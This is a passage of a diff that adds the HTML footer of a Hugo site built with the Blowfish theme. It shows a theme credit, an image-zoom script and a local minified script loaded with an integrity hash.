+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a> 强力驱动
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+
+    </div>
+  </body>
+  
+</html>
